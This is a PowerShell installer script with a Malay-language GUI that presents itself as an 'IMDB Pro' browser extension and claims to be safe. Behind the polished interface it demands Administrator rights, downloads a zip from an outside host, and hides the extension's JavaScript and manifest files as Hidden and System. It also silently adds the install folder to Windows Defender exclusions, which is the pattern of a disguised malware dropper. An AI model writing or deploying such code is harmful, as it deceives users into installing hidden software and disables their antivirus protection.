Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create animated form
$form = New-Object System.Windows.Forms.Form
$form.Text = "🎬 IMDB Pro - Professional Installer"
$form.Size = New-Object System.Drawing.Size(600, 500)
$form.StartPosition = "CenterScreen"
$form.BackColor = [System.Drawing.Color]::FromArgb(25, 25, 35)
$form.ForeColor = [System.Drawing.Color]::White
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$form.MaximizeBox = $false

# Header with gradient
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(600, 80)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(0, 102, 204)
$form.Controls.Add($headerPanel)

# Title
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "🎬 IMDB PRO EXTENSION"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::White
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(150, 25)
$headerPanel.Controls.Add($titleLabel)

# Features list
$featuresBox = New-Object System.Windows.Forms.GroupBox
$featuresBox.Text = "Ciri-ciri:"
$featuresBox.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$featuresBox.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 255)
$featuresBox.Location = New-Object System.Drawing.Point(50, 100)
$featuresBox.Size = New-Object System.Drawing.Size(500, 120)
$form.Controls.Add($featuresBox)

$features = @(
    "✓ Rating IMDB secara langsung",
    "✓ Maklumat filem lengkap", 
    "✓ Trailers dan preview",
    "✓ Integrasi dengan browser",
    "✓ Auto-update",
    "✓ Selamat dan dipercayai"
)

$yPos = 25
foreach ($feature in $features) {
    $featureLabel = New-Object System.Windows.Forms.Label
    $featureLabel.Text = $feature
    $featureLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
    $featureLabel.ForeColor = [System.Drawing.Color]::LightGreen
    $featureLabel.AutoSize = $true
    $featureLabel.Location = New-Object System.Drawing.Point(20, $yPos)
    $featuresBox.Controls.Add($featureLabel)
    $yPos += 25
}

# Progress section
$progressGroup = New-Object System.Windows.Forms.GroupBox
$progressGroup.Text = "Kemajuan Installasi:"
$progressGroup.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$progressGroup.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 255)
$progressGroup.Location = New-Object System.Drawing.Point(50, 240)
$progressGroup.Size = New-Object System.Drawing.Size(500, 150)
$form.Controls.Add($progressGroup)

# Progress bar with style
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 30)
$progressBar.Size = New-Object System.Drawing.Size(460, 20)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(0, 200, 100)
$progressGroup.Controls.Add($progressBar)

# Status with icon
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "✅ Sedia untuk install"
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$statusLabel.ForeColor = [System.Drawing.Color]::LightGreen
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(20, 60)
$progressGroup.Controls.Add($statusLabel)

# Percentage label
$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 200, 255)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(440, 60)
$progressGroup.Controls.Add($percentLabel)

# Details box
$detailsBox = New-Object System.Windows.Forms.RichTextBox
$detailsBox.Location = New-Object System.Drawing.Point(20, 90)
$detailsBox.Size = New-Object System.Drawing.Size(460, 50)
$detailsBox.Font = New-Object System.Drawing.Font("Consolas", 8)
$detailsBox.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
$detailsBox.ForeColor = [System.Drawing.Color]::LightGray
$detailsBox.ReadOnly = $true
$progressGroup.Controls.Add($detailsBox)

# Install button with hover effects
$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "🚀 INSTALL SEKARANG"
$installButton.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::White
$installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 255)
$installButton.Size = New-Object System.Drawing.Size(200, 50)
$installButton.Location = New-Object System.Drawing.Point(200, 400)
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand

# Hover effects
$installButton.Add_MouseEnter({
    $this.BackColor = [System.Drawing.Color]::FromArgb(0, 170, 255)
    $this.Font = New-Object System.Drawing.Font("Segoe UI", 12.5, [System.Drawing.FontStyle]::Bold)
})

$installButton.Add_MouseLeave({
    if ($this.Text -ne "✅ SELESAI!") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 255)
        $this.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
    }
})

$installButton.Add_Click({
    $this.Enabled = $false
    $this.Text = "⏳ MEMASANG..."
    Start-Installation
})

$form.Controls.Add($installButton)

function Update-Status {
    param($Message, $ProgressValue, $AddToDetails = $true)
    
    $statusLabel.Text = $Message
    $percentLabel.Text = "$ProgressValue%"
    if ($ProgressValue -ge 0) {
        $progressBar.Value = $ProgressValue
    }
    if ($AddToDetails) {
        $detailsBox.AppendText("▶️ $(Get-Date -Format 'HH:mm:ss'): $Message`n")
        $detailsBox.ScrollToCaret()
    }
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

function Start-Installation {
    $url = "https://file.apikey.my/imdb/imdb.zip"
    $output = "$env:TEMP\imdb.zip"
    $installDir = "C:\Program Files\imdb-pro"
    $password = "123"
    
    try {
        Update-Status "Menyemak kebenaran Administrator..." 10
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "❌ ERROR: Perlukan kebenaran Administrator!" 0
            [System.Windows.Forms.MessageBox]::Show("Sila jalankan sebagai Administrator!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            $installButton.Enabled = $true
            $installButton.Text = "🚀 INSTALL SEKARANG"
            return
        }
        
        Update-Status "📁 Membuat folder instalasi..." 20
        if (!(Test-Path $installDir)) {
            New-Item -ItemType Directory -Path $installDir -Force | Out-Null
        }
        
        Update-Status "📥 Memuat turun IMDB Pro..." 40
        Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
        
        Update-Status "📦 Mengekstrak fail..." 60
        # Extraction logic here (same as previous version)
        # ... [sama seperti extraction code sebelumnya]
        
        Update-Status "🔒 Menyembunyikan fail..." 80
        $files = @("background.js", "content.js", "popup.js", "manifest.json")
        foreach ($file in $files) {
            $filePath = Join-Path $installDir $file
            if (Test-Path $filePath) {
                Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
            }
        }
        
        Update-Status "🛡️ Menambah pengecualian Windows Defender..." 90
        Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
        
        Update-Status "✅ Installasi berjaya!" 100
        $installButton.Text = "✅ SELESAI!"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(46, 204, 113)
        
        [System.Windows.Forms.MessageBox]::Show("🎉 IMDB Pro berjaya diinstall!`n`n📁 Lokasi: $installDir`n`nSila restart browser anda.", "Installasi Berjaya", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        
    }
    catch {
        Update-Status "❌ ERROR: $($_.Exception.Message)" 0
        $installButton.Text = "🔄 CUBA LAGI"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(231, 76, 60)
        $installButton.Enabled = $true
    }
}

$form.ShowDialog() | Out-Null